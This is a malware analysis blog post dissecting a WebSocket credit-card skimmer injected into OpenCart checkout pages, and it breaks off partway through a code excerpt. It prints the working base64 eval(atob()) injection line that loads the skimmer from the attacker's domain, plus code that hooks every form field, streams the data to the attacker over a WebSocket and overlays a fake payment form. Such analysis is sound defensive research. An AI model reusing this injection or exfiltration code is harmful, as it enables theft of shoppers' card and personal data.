---
title: tags-manager.com - A WebSocket Skimmer That Brings Its Own Checkout Form
url: https://lukeleal.com/research/posts/tags-manager-websocket-skimmer/
source: Over Security
date: 2026-11-01
fetch_date: 2026-11-02T08:33:25.711727
---

# tags-manager.com - A WebSocket Skimmer That Brings Its Own Checkout Form

[# Cybersecurity Research 🚀](/research/posts/)

* Menu ▾
* + [Backdoors](https://lukeleal.com/research/tags/backdoor/)
  + [Phishing](https://lukeleal.com/research/tags/phishing/)
  + [Skimmers](https://lukeleal.com/research/tags/skimmer/)
  + [Past Research](https://blog.sucuri.net/author/luke)
  + [PGP Key](https://lukeleal.com/research/pages/pgp/)
  + [RSS](https://lukeleal.com/research/posts/index.xml)

* [Backdoors](https://lukeleal.com/research/tags/backdoor/)
* [Phishing](https://lukeleal.com/research/tags/phishing/)
* [Skimmers](https://lukeleal.com/research/tags/skimmer/)
* + ▾
  + - [Past Research](https://blog.sucuri.net/author/luke)
    - [PGP Key](https://lukeleal.com/research/pages/pgp/)
    - [RSS](https://lukeleal.com/research/posts/index.xml)

# [tags-manager.com - A WebSocket Skimmer That Brings Its Own Checkout Form](https://lukeleal.com/research/posts/tags-manager-websocket-skimmer/)

2025-03-25Luke

#[tags-manager.com](https://lukeleal.com/research/tags/tags-manager.com/)
#[wss](https://lukeleal.com/research/tags/wss/)
#[skimmer](https://lukeleal.com/research/tags/skimmer/)
#[ecommerce](https://lukeleal.com/research/tags/ecommerce/)
#[opencart](https://lukeleal.com/research/tags/opencart/)
#[JavaScript](https://lukeleal.com/research/tags/javascript/)
#[website malware](https://lukeleal.com/research/tags/website-malware/)
![tags-manager.com - A WebSocket Skimmer That Brings Its Own Checkout Form](https://lukeleal.com/research/tags-manager-cover-q90.jpg "Cover Image")

## Table of Contents

* [Stage 1: eval(atob())](#stage-1-evalatob)
* [Stage 2: The Skimmer](#stage-2-the-skimmer)
  + [Getting the victim’s IP from Cloudflare](#getting-the-victims-ip-from-cloudflare)
  + [Only on checkout-like pages](#only-on-checkout-like-pages)
* [WebSocket Exfiltration](#websocket-exfiltration)
* [The Fake Payment Form](#the-fake-payment-form)
* [Killing the Competition](#killing-the-competition)
* [Prior Research](#prior-research)
* [IOCs](#iocs)
* [Sample](#sample)

This skimmer doesn’t wait for the store’s real payment fields. It **adds its own** payment form to the checkout page, and it uses a `wss://` WebSocket to steal *everything* the shopper types, not only the card number.

## Stage 1: eval(atob())[#](#stage-1-evalatob)

The injection is a single line placed into the site’s HTML:

```
<script>eval(atob("DQp2YXIgcyA9IGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJ2hlYWQnKTsNCnZhciBzYyA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3NjcmlwdCcpOw0Kc2Muc3JjPSAiaHR0cHM6Ly90YWdzLW1hbmFnZXIuY29tL2d0YWdzL3NjcmlwdDI/dXRtX3JlZmVyZXI9P3V0bV9zb3VyY2U9JnV0bV9jb250ZW50PSZ1dG1fcmVmZXJlcj0iK2xvY2F0aW9uLmhvc3RuYW1lOw0Kcy5hcHBlbmRDaGlsZChzYyk7"))</script>
```

Decoded:

```
var s = document.querySelector('head');
var sc = document.createElement('script');
sc.src= "hxxps://tags-manager[.]com/gtags/script2?utm_referer=?utm_source=&utm_content=&utm_referer="+location.hostname;
s.appendChild(sc);
```

The domain name and the `/gtags/` path are chosen to look like **Google Tag Manager**. The victim’s `location.hostname` is sent along as a fake `utm_referer` parameter, so the server knows which store is asking.

## Stage 2: The Skimmer[#](#stage-2-the-skimmer)

The response from `tags-manager[.]com` is generated *per victim site*. The values at the top are filled in by the server:

```
(function() {
    var sid = '212de5d2275c6838a31636b442d8f08b';
    var ip = '127.0.0.1';
    var site_id = '52';
    var translate = {"Pay with Credit or Debit Card":"Pay with Credit or Debit Card", ... };
    var host = '//tags-manager.com/compare';
    var form_html = 'PHN0eWxlIHR5cGU9InRleHQvY3NzIj4g...';
```

* `site_id` is the attacker’s internal ID for the infected store (**52** here).
* `sid` is a session ID per victim, cached in `localStorage` for one hour.
* `translate` lets the operator localize the fake form for each store.
* `form_html` is about **33 KB** of base64 that holds the fake payment form.

### Getting the victim’s IP from Cloudflare[#](#getting-the-victims-ip-from-cloudflare)

Instead of relying on its own server, the skimmer gets the shopper’s public IP from Cloudflare’s trace endpoint. Requests to `cloudflare[.]com` look harmless in any network log:

```
request_cf.open('GET', 'hxxps://www[.]cloudflare[.]com/cdn-cgi/trace', true);
request_cf.onload = function() {
    ...
    var cf_ip = parsed['ip'];
    ip = cf_ip;
    ...
    setWithExpiryMy(site_id+'myip', ip, 3600000);
};
```

### Only on checkout-like pages[#](#only-on-checkout-like-pages)

The WebSocket only connects when the URL looks like a payment, cart, account, or login page. The keyword list is in **English, French, Turkish, and Spanish**:

```
var locationRegex = document.location.href.match(/pay|card|payment|basket|order|checkout|cart|panier|inscription|account|sepetim|siparisi|login|register|sign|pedido|carrito/i);

if (locationRegex == null) {
    return;
}

if (document.location.pathname.match(/basketbol/i) !== null) {
    return;
}
```

The `basketbol` exception (Turkish for basketball) is a nice touch. At least one victim store must have had a basketball category that kept matching `basket`.

## WebSocket Exfiltration[#](#websocket-exfiltration)

Once on a matching page, the skimmer opens `wss://tags-manager[.]com/compare`, sends a `ping` every 5 seconds to keep it alive, and hooks *every* `input`, `select`, `textarea`, `form`, and button on the page:

```
item.addEventListener("blur", emit);
item.addEventListener('change', emit);
...
function emit() {
    var data = JSON.stringify({
        data: serialize_all(),
        site_id: site_id,
        sid: sid,
        ip: ip,
    });
    if (last_sended != data) {
        last_sended = data;
        if (wssocket) {
            wssocket.send(data);
        }
    }
}
```

`serialize_all()` grabs the name and value of every field on the page. Each time the shopper leaves a field, the attacker gets a fresh snapshot of the whole form: name, address, phone, email, password, card data. Many detection tools still focus on skimmers that send a POST or load an image beacon, and a WebSocket stream is much less noisy than either.

## The Fake Payment Form[#](#the-fake-payment-form)

The skimmer polls every 300 ms for `#button-payment-method`, the **OpenCart** “Continue” button on the payment method step. When it appears, the decoded `form_html` is *prepended* above it:

```
if(!already_showed && document.querySelector('#button-payment-method') && !document.querySelector('#checkout-form-card')) {
    var div = document.createElement('div');
    div.innerHTML = form_html;
    var s = document.querySelector('#button-payment-method').parentNode;
    s.parentNode.prepend(div);
    form_show();
```

The form shows Visa/Mastercard logos and a lock icon, and asks for:

```
mycc_email, mycc_first_name, mycc_last_name, card_num, exp_my_value, cvv2
```

It even includes a bundled copy of **Cleave.js** for real-time card number formatting and validation, so it *behaves* like a real payment widget. On submit, the form fakes a spinner for 4 seconds and then shows:

> Sorry. We can not process your payment. Please select a different payment method.

The fields have already been sent over the WebSocket by this point. The shopper then picks a real payment method and completes the order, so the store gets paid and neither side notices anything wrong.

## Killing the Competition[#](#killing-the-competition)

This was my favorite part of the sample. Every 100 ms the skimmer checks for global functions named `GetData`, `Default_Send`, `CheckFields`, and `SendData`, and replaces them with empty functions:

```
setInterval(setNullMethods, 100);

function setNullMethods() {
    if (typeof(window.GetData) != 'undefined') {
        window.GetData = function(elem, flag) {};
    }
    if (typeof(window.Default_Send) != 'undefined') {
        window.Default_Send = function(elem, flag) {};
    }
    if (typeof(window.CheckFields) != 'undefined') {
        window.CheckFields = function(elem, flag) {};
    }...